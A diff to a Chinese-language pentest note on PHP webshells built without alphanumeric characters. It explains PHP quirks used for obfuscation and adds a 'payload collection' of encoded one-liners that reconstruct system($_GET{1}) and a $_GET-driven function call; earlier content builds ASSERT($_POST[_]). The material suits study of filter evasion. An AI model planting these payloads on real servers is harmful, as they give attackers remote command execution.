@@ -6,6 +6,19 @@
 
  https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 
 
+ https://xz.aliyun.com/t/5677 
+
+
+
+## php特性
+
+1. Php的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串，7.2开始提出要被废弃，不过目前还存在着 
+
+2. 字符串++,会改变字符串的最后一个字符
+3. 两个字符串位操作,会按顺序进行位操作,若长度不同,最终长度和短的那个相同
+
+
+
 
 
 ## 思路
@@ -117,3 +130,18 @@ $____.=$__;
 $_=$$____;
 $___($_[_]); // ASSERT($_POST[_]);
 ```
+
+
+
+
+
+## payload收集
+
+```php
+$pi=base_convert;$pi(1751504350,10,36)(${$pi(1115654,10,36)^((100).(1))}{1});
+#system($_GET{1})
+${%A0%B8%BA%AB^%ff%ff%ff%ff}{%ff}();#urldecode一下
+#$_GET['\xff']();
+
+```
+
